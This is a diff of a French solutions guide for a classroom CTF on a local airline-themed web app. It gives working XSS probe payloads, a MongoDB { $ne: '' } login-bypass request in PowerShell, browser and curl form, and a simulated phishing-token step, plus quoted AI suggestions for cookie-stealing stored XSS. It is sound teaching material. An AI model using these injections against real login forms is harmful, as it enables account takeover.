@@ -1,42 +1,63 @@
 # CTF Vol 404 - Solutions
 
-Ce document donne deux parcours complets:
+Ce document donne deux parcours complets pour résoudre le CTF de bout en bout.
 
-1. Parcours A: terminal PowerShell (rapide pour corriger et verifier)
-2. Parcours B: navigateur (plus pedagogique pour les etudiants)
+| Parcours | Pour qui | Durée estimée |
+|---|---|---|
+| **A — PowerShell** | Professeur, correction rapide | ~5 min |
+| **B — Navigateur** | Etudiants, pédagogique | ~1h |
 
 ---
 
-## Prerequis
-
-1. L'app est lancee sur http://localhost:3000
-2. MongoDB est disponible (Docker compose ou local)
-3. Le seed a ete execute
-
-Commandes utiles:
+## Prérequis (commun aux deux parcours)
 
 ```powershell
+# Lancer l'application et la base de données
 docker compose up -d --build
-npm run seed
+
+# Vérifier que tout tourne
+docker compose ps
+```
+
+L'app est accessible sur **http://localhost:3000**
+
+---
+
+## Vue d'ensemble des étapes
+
+```
+1. Reconnaissance    → trouver passengers.html dans le code source
+2. XSS              → injecter un payload dans le formulaire de login
+3. NoSQL Injection  → bypass du mot de passe avec { $ne: '' }
+4. Logs admin       → accéder à /auth/logs sans être admin
+5. QR code + gate   → scanner le billet pour passer la porte
+6. Cryptanalyse     → décoder RVN (Vigenère) + JN18ER (QTH Locator)
+7. Phishing         → soumettre un lien au bot admin pour obtenir un token
+8. Flag final       → soumettre le code département 94 → CTF{ORY_boarding_complete}
 ```
 
 ---
 
-## Parcours A - Solution PowerShell complete
+## Parcours A — PowerShell (correction rapide)
 
-### 1) Verifier les passagers
+### Étape 1 — Vérifier les passagers
 
 ```powershell
 (Invoke-RestMethod -Uri 'http://localhost:3000/billets/passengers').Count
+# Résultat attendu : liste de passagers dont "alice"
 ```
 
-### 2) Creer une session HTTP (cookies)
+### Étape 2 — Créer une session HTTP persistante
+
+> Nécessaire pour garder les cookies entre les requêtes.
 
 ```powershell
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 ```
 
-### 3) Condition XSS (premiere etape)
+### Étape 3 — Déclencher la condition XSS
+
+> Le backend détecte les balises HTML dans le champ username et marque xssDone = true.
 
 ```powershell
 $xss = @{ username = '<img src=x onerror=alert(1)>'; password = 'wrong' } | ConvertTo-Json -Depth 4
@@ -45,111 +66,117 @@ try {
 } catch {}
 ```
 
-### 4) Condition NoSQL (deuxieme etape)
+### Étape 4 — Déclencher la condition NoSQL et se connecter
+
+> Le mot de passe `{ $ne: '' }` signifie "différent de vide" → MongoDB retourne true → login accepté.
 
 ```powershell
 $nosql = @{ username = 'alice'; password = @{ '$ne' = '' } } | ConvertTo-Json -Depth 4
 Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentType 'application/json' -WebSession $session -Body $nosql
 ```
 
-### 5) Verifier les logs admin
+### Étape 5 — Lire les logs admin
+
+> Cette route est accessible uniquement après XSS + NoSQL. Elle confirme que les conditions sont validées.
 
 ```powershell
 Invoke-RestMethod -Uri 'http://localhost:3000/auth/logs' -WebSession $session
 ```
 
-### 6) Charger le billet (QR obligatoire)
+### Étape 6 — Récupérer le billet
+
+> Le QR doit obligatoirement être scanné depuis billet.html dans un vrai navigateur.
+> Le scan depuis le téléphone redirige automatiquement le PC vers le résultat du gate.
 
 ```powershell
 $ticket = Invoke-RestMethod -Uri 'http://localhost:3000/billets/my' -WebSession $session
 $ticket | Format-List
 ```
 
-Important:
+Le gate renvoie ce JSON :
 
-1. Le QR doit etre scanne depuis `billet.html`
-2. Le scan ouvre `/gate/scan/<scanId>` sur le telephone
-3. Le PC est redirige automatiquement vers `/gate/scan-result/<scanId>`
+```json
+{
+  "gate": "B7",
+  "flightCode": "AF404",
+  "message": "RVN",
+  "hint": "QTH Locator : JN18ER",
+  "indice": "La clé survole la banlieue parisienne..."
+}
+```
 
-Transition storytelling:
+**Décodage :**
+- `JN18ER` (QTH Locator) → coordonnées GPS → région **Val-de-Marne** → département **94**
+- `RVN` (Vigenère, clé = DEPARTEMENT) → `ORY` = code IATA de Paris-Orly
 
-Le scan doit etre compris comme un point de bascule dans le scenario. L'etudiant a franchi la barriere technique cote embarquement, mais il tombe maintenant sur une couche de validation plus "humaine".
+### Étape 7 — Phishing : obtenir le token temporaire
 
-Message in-universe possible a faire lire ou ressentir aux etudiants:
-
-> Note interne AF404 - Supervision escale
->
-> Le controle QR confirme l'acces a la zone gate, mais l'ouverture de la zone finale reste soumise a validation manuelle par un agent habilite. En cas d'incident, transmettre un lien de verification au poste de supervision afin d'obtenir un jeton temporaire d'override.
-
-Autrement dit: le QR prouve qu'ils sont arrives au bon endroit, mais il ne suffit plus de "casser" une route. La suite logique consiste a viser le workflow de validation et a obtenir un token temporaire via le module phishing.
-
-### 7) Phishing : soumettre le lien et recuperer le token
-
-Soumettre une URL qui commence par `/phish/page/` :
+> Le bot admin (worker 30s) accepte uniquement les URLs commençant par `/phish/page/`.
+> Le token est valide 5 minutes et à usage unique.
 
 ```powershell
-$report = Invoke-RestMethod -Uri 'http://localhost:3000/phish/report' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ url = '/phish/page/alice' } | ConvertTo-Json)
+# 7a. Soumettre le lien de phishing
+$report = Invoke-RestMethod -Uri 'http://localhost:3000/phish/report' `
+  -Method Post -ContentType 'application/json' -WebSession $session `
+  -Body (@{ url = '/phish/page/alice' } | ConvertTo-Json)
 $reportId = $report.reportId
-$reportId
-```
+Write-Host "Report ID : $reportId"
 
-Attendre ~30 secondes le passage du worker, puis recuperer le token :
-
-```powershell
+# 7b. Attendre ~30 secondes puis récupérer le token
+Start-Sleep -Seconds 35
 $result = Invoke-RestMethod -Uri "http://localhost:3000/phish/result/$reportId" -WebSession $session
-$result
 $phishToken = $result.token
+Write-Host "Token : $phishToken"
+
+# 7c. Utiliser le token pour débloquer la zone flag
+Invoke-RestMethod -Uri 'http://localhost:3000/flag/unlock' `
+  -Method Post -ContentType 'application/json' -WebSession $session `
+  -Body (@{ token = $phishToken } | ConvertTo-Json)
 ```
 
-Debloquer la page flag avec le token (usage unique, valide 5 min) :
+### Étape 8 — Soumettre le code final
 
 ```powershell
-Invoke-RestMethod -Uri 'http://localhost:3000/flag/unlock' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ token = $phishToken } | ConvertTo-Json)
-```
-
-### 8) Soumettre le code final
-
-```powershell
-$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 94 } | ConvertTo-Json)
+$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' `
+  -Method Post -ContentType 'application/json' -WebSession $session `
+  -Body (@{ code = 94 } | ConvertTo-Json)
 $flag
 ```
 
-Resultat attendu:
+**Résultat attendu :**
 
-```text
+```
 CTF{ORY_boarding_complete}
 ```
 
 ---
 
+## Parcours B — Navigateur (pédagogique, sans PowerShell)
 
-
-
-
-
-## Parcours B - Solution navigateur (sans PowerShell)
-
-### 1) Reperer la cible
+### Étape 1 — Reconnaissance
 
 1. Ouvrir http://localhost:3000
-2. Afficher le code source (Ctrl+U)
-3. Trouver la route cachee `passengers.html`
+2. Afficher le code source : **Ctrl+U**
+3. Chercher une page cachée → trouver `passengers.html`
 4. Ouvrir http://localhost:3000/passengers.html
-5. Identifier la cible `alice`
+5. Identifier la cible : **alice**
 
-### 2) Valider la condition XSS
+### Étape 2 — XSS
 
 1. Ouvrir http://localhost:3000/login.html
-2. Tester dans le formulaire:
+2. Dans le champ **username**, saisir :
 
-```text
-username = <img src=x onerror=alert(1)> // <script>alert('XSS-SCRIPT')</script>
-password = nimportequoi
+```
+<img src=x onerror=alert(1)>
 ```
 
-### 3) Valider la condition NoSQL (DevTools)
+3. N'importe quoi en mot de passe → soumettre
+4. La tentative est détectée → `xssDone = true` en base
 
-Dans la console navigateur sur `login.html`:
+### Étape 3 — NoSQL Injection (console DevTools)
+
+1. Ouvrir les DevTools : **F12 → Console**
+2. Coller et exécuter :
 
 ```javascript
 fetch('/auth/login', {
@@ -158,45 +185,103 @@ fetch('/auth/login', {
   credentials: 'include',
   body: JSON.stringify({
     username: 'alice',
-    password: { $ne: '' }
+    password: { $ne: '' }   // "différent de vide" → MongoDB accepte
   })
 })
   .then(r => r.json())
   .then(console.log);
 ```
 
-Le front appelle déjà la route dans le code de la page login: login.html
-En soumettant le formulaire, DevTools Network affiche directement la requête POST vers /auth/login.
-En échec de login, le backend renvoie un hint sur le préfixe /auth/: authController.js
+3. Résultat attendu : `{ ok: true, ... }` → connecté en tant qu'alice
 
-### 4) Verifier les logs admin
+### Étape 4 — Accès aux logs admin
 
-Ouvrir:
+Ouvrir directement dans le navigateur :
 
-```text
+```
 http://localhost:3000/auth/logs
 ```
 
-### 5) Etape QR obligatoire
+La page liste les tentatives XSS et NoSQL enregistrées. Accessible sans être admin si les deux conditions précédentes sont remplies.
+
+### Étape 5 — QR code et gate
 
 1. Ouvrir http://localhost:3000/billet.html
-2. Scanner le QR avec le telephone
-3. Le telephone ouvre le JSON gate
-4. Le PC est redirige automatiquement vers le gate JSON
+2. Scanner le QR code avec le **téléphone**
+3. Le téléphone affiche le JSON gate
+4. Le **PC est automatiquement redirigé** vers le résultat
 
-Le JSON gate ressemble a:
+JSON reçu :
 
 ```json
-{"gate":"B7","flightCode":"AF404","message":"RVN","hint":"QTH Locator : JN18ER","indice":"La cle survole la banlieue parisienne..."}
+{
+  "gate": "B7",
+  "flightCode": "AF404",
+  "message": "RVN",
+  "hint": "QTH Locator : JN18ER",
+  "indice": "La clé survole la banlieue parisienne..."
+}
 ```
 
-Transition storytelling:
+### Étape 6 — Cryptanalyse
 
-Le QR et le JSON gate servent de pivot narratif. L'etudiant comprend qu'il a reussi l'intrusion technique cote embarquement, mais que la zone finale reste verrouillee par un mecanisme distinct. Le jeu doit donc lui faire sentir qu'il faut changer d'approche: apres l'exploitation technique, place a la manipulation du workflow humain. C'est ce qui justifie l'etape suivante de phishing pour obtenir le token de deverrouillage.
+**But de cette étape :** trouver le **code final à envoyer plus tard** à la route `/flag`.
 
-### 6) Phishing : entrainement console + verification sur flag.html
+Ici, l'étape 6 **ne donne pas encore le flag**. Elle donne la **bonne valeur** à soumettre à la fin.
 
-Dans DevTools Console sur n'importe quelle page (session active requise), soumettre d'abord le report phishing :
+**Ce que l'étudiant doit faire concrètement :**
+
+1. Regarder le JSON obtenu après le scan du QR
+2. Repérer les deux indices : `RVN` et `JN18ER`
+3. Comprendre que ces deux indices servent à retrouver une destination et un département
+4. En déduire la valeur finale à envoyer plus tard
+
+**Décoder QTH Locator `JN18ER` :**
+- Outil : https://www.qth.app ou tout convertisseur QTH Locator
+- `JN18ER` → Île-de-France, **Val-de-Marne** → département **94**
+
+**Décoder Vigenère `RVN` :**
+- Clé : `DEPARTEMENT` (indice = "la clé survole la banlieue parisienne" = département)
+- `RVN` déchiffré → `ORY` = code IATA de **Paris-Orly**
+
+**Ce qu'il faut retenir à la fin de l'étape 6 :**
+- `ORY` confirme qu'on parle de **Paris-Orly**
+- `Paris-Orly` est lié au **Val-de-Marne**
+- donc le **code final à soumettre** sera **94**
+
+Autrement dit :
+
+```text
+Étape 6 = je trouve la bonne réponse finale
+Réponse finale = 94
+```
+
+**À ce moment-là, l'étudiant ne doit pas encore envoyer `94` à `/flag`.**
+
+Pourquoi ?
+- parce que la zone finale est encore verrouillée
+- il faut d'abord faire l'étape phishing pour obtenir le droit d'entrer
+
+### Étape 7 — Phishing (DevTools Console)
+
+**But de cette étape :** débloquer l'accès à la zone finale.
+
+Le point important est le suivant :
+
+```text
+Étape 6 donne la bonne réponse (94)
+mais
+Étape 7 donne le droit d'utiliser cette réponse
+```
+
+Sans le token phishing, même avec la bonne valeur `94`, la route `/flag` répondra `403` car la zone finale est encore verrouillée.
+
+**Ce que l'étudiant doit comprendre ici :**
+- `94` = la bonne réponse finale
+- `token phishing` = la clé d'accès pour pouvoir soumettre cette réponse
+- il faut donc faire **les deux**
+
+**7a. Soumettre le report phishing** (dans la console, session active requise) :
 
 ```javascript
 fetch('/phish/report', {
@@ -209,16 +294,45 @@ fetch('/phish/report', {
   .then(data => { console.log(data); window._reportId = data.reportId; });
 ```
 
-Ensuite :
+**Ce que fait ce code :**
+- il envoie un lien au module phishing
+- le backend crée un report en statut `pending`
+- il renvoie un `reportId`
+- on stocke ce `reportId` dans `window._reportId` pour le réutiliser facilement ensuite
+
+**Ce que l'étudiant doit faire juste après :**
+
+1. Vérifier qu'un objet s'affiche dans la console
+2. Vérifier qu'il contient bien un `reportId`
+3. Ne pas fermer l'onglet tout de suite
+4. Copier ce `reportId` si besoin
+
+**7b. Vérifier le résultat sur flag.html :**
 
 1. Ouvrir http://localhost:3000/flag.html
-2. Coller `window._reportId` dans le champ Report ID
-3. Cliquer sur **Verifier resultat**
-4. Si `pending`, patienter et recliquer
+2. Coller `window._reportId` dans le champ **Report ID**
+3. Cliquer sur **Vérifier résultat**
+4. Si `pending` → attendre 30s et recliquer
+5. Quand `success` → `window._phishToken` est rempli automatiquement
 
-Quand la verification reussit, le token est stocke dans `window._phishToken`.
+**Ce qui se passe côté backend :**
+- le worker passe toutes les 30 secondes
+- il lit un report `pending`
+- si l'URL commence bien par `/phish/page/`, il génère un token temporaire
+- ce token est ensuite renvoyé au front
+- le front le place dans `window._phishToken`
 
-Debloquer alors en console (obligatoire, pas de bouton UI) :
+**Ce que l'étudiant doit voir à l'écran :**
+- un message du type `Token récupéré`
+- un compte à rebours du token
+- la variable `window._phishToken` disponible dans la console
+
+**Si l'étudiant voit `pending` :**
+- ce n'est pas une erreur
+- cela veut juste dire que le worker n'est pas encore passé
+- il faut attendre puis recliquer sur **Vérifier résultat**
+
+**7c. Débloquer la zone flag** (obligatoire en console, pas de bouton) :
 
 ```javascript
 fetch('/flag/unlock', {
@@ -229,61 +343,90 @@ fetch('/flag/unlock', {
 })
   .then(r => r.json())
   .then(console.log);
+// Résultat attendu : { success: true, redirect: '/flag.html' }
 ```
 
+**Ce que fait ce code :**
+- il envoie le token à `/flag/unlock`
+- le backend vérifie que le token est correct, non expiré, et pas déjà utilisé
+- si c'est bon, il met `flagUnlocked = true` dans la session
 
-Postman possible 
+**Ce que l'étudiant doit vérifier après exécution :**
+- dans la console : `{ success: true, redirect: '/flag.html' }`
+- sur la page : un message qui dit que la zone finale est débloquée
+- si besoin, recharger `flag.html`
 
-Curl possible : 
-
-curl -c cookies.txt -H "Content-Type: application/json" \
-  -d "{\"username\":\"alice\",\"password\":{\"$ne\":\"\"}}" \
-  http://localhost:3000/auth/login
-
-curl -b cookies.txt -H "Content-Type: application/json" \
-  -d "{\"code\":94}" \
-  http://localhost:3000/flag
-
-Resultat attendu:
+Autrement dit :
 
 ```text
+Étape 7 = j'obtiens l'autorisation d'entrer dans la dernière zone
+```
+
+### Étape 8 — Flag final
+
+**Maintenant seulement**, la zone flag est déverrouillée.
+
+Tu peux donc envoyer la valeur trouvée à l'étape 6, c'est-à-dire `94`.
+
+La logique complète est :
+
+```text
+Étape 6 → je découvre 94
+Étape 7 → je débloque l'accès avec le token
+Étape 8 → j'envoie 94 à /flag
+```
+
+**Ce que l'étudiant doit faire concrètement :**
+
+1. Garder en tête la valeur trouvée à l'étape 6 : `94`
+2. Vérifier que la zone finale est bien déverrouillée
+3. Exécuter la requête ci-dessous dans la console
+4. Lire la réponse renvoyée par le serveur
+
+Soumettre le code :
+
+```javascript
+fetch('/flag', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  credentials: 'include',
+  body: JSON.stringify({ code: 94 })
+})
+  .then(r => r.json())
+  .then(console.log);
+```
+
+**Pourquoi `code: 94` ?**
+- parce que l'étape 6 a permis de retrouver le département associé à la destination
+- `/flag` attend justement ce code département
+- comme la session a déjà été déverrouillée à l'étape 7, le backend accepte maintenant la réponse
+
+**Ce que l'étudiant doit voir à la fin :**
+
+```json
+{ "flag": "CTF{ORY_boarding_complete}" }
+```
+
+Si l'étudiant reçoit une erreur :
+- `403` → la zone n'a pas été déverrouillée, refaire l'étape 7
+- `400` → mauvaise valeur envoyée, revérifier l'étape 6
+
+**Résultat attendu :**
+
+```
 CTF{ORY_boarding_complete}
 ```
 
 ---
 
-## Notes prof (anti blocage rapide)
+## Notes prof — dépannage rapide
 
-1. Si le scan ouvre `localhost` sur telephone: verifier `PUBLIC_BASE_URL` dans `.env`
-2. Si le telephone ne charge pas l'URL LAN: verifier meme Wi-Fi + firewall Windows port 3000
-3. Si le QR ne debloque pas le PC: recharger `billet.html` pour regenerer un QR (nouveau `scanId`)
-4. Si la session expire: refaire login puis reprendre a l'etape billet
-
-
-
-## idée possible pour finir le storytelling
-on pourrait faire de la gestion de token avec un truc en mode ils ont telle temps pour pouvoir le valider et pour récuperer le token il devraient faire du fishing
-
-
-réponses IA : 
-Ce qui est pédagogiquement fort :
-
-XSS → phishing est une vraie chaîne d'attaque réaliste (OWASP A3/A7)
-Vous avez déjà la condition XSS dans le CTF (step 3), mais elle ne fait que alert(1). La rendre fonctionnelle (vol de token) c'est l'étape logique suivante
-Le time limit ajoute de la pression et simule un vrai scénario
-Le gros problème technique :
-Pour simuler une victime qui "clique" sur le lien de phishing, il faut soit :
-
-Un bot headless (Puppeteer) qui visite l'URL soumise → complexe, ressources Docker
-Un endpoint serveur qui simule le clic côté backend → plus simple mais moins réaliste
-Un vrai complice (le prof joue la victime manuellement) → pédagogique mais fragile en conditions réelles
-Sans ça, les étudiants soumettent un lien... dans le vide. Ça ne fonctionne pas.
-
-Une version réaliste et faisable pour votre stack :
-
-Une route /admin/review — le "modérateur" visite automatiquement les billets signalés toutes les 30s (cron job serveur, pas de headless browser)
-Le stored XSS sur le champ username (déjà en place) exfiltre le cookie/token du modérateur vers une URL contrôlée par l'étudiant
-Le token récupéré est à usage unique avec TTL de 5 minutes
-Ce token donne accès à /cockpit
-C'est faisable sans Puppeteer — le serveur simule lui-même la "visite" du modérateur en executant le payload XSS côté serveur via un parser HTML minimaliste.
+| Problème | Solution |
+|---|---|
+| Le scan ouvre `localhost` sur le téléphone | Vérifier `PUBLIC_BASE_URL` dans `.env` (mettre l'IP LAN) |
+| Le téléphone ne charge pas l'URL | Vérifier même Wi-Fi + firewall Windows port 3000 |
+| Le QR ne redirige pas le PC | Recharger `billet.html` → nouveau `scanId` généré |
+| La session expire | Refaire login NoSQL puis reprendre à l'étape billet |
+| Token phishing invalide | Token à usage unique ou expiré (5 min) → refaire étape 7 |
+| `pending` après 30s | Worker traite 1 report par cycle → attendre encore 30s |
 
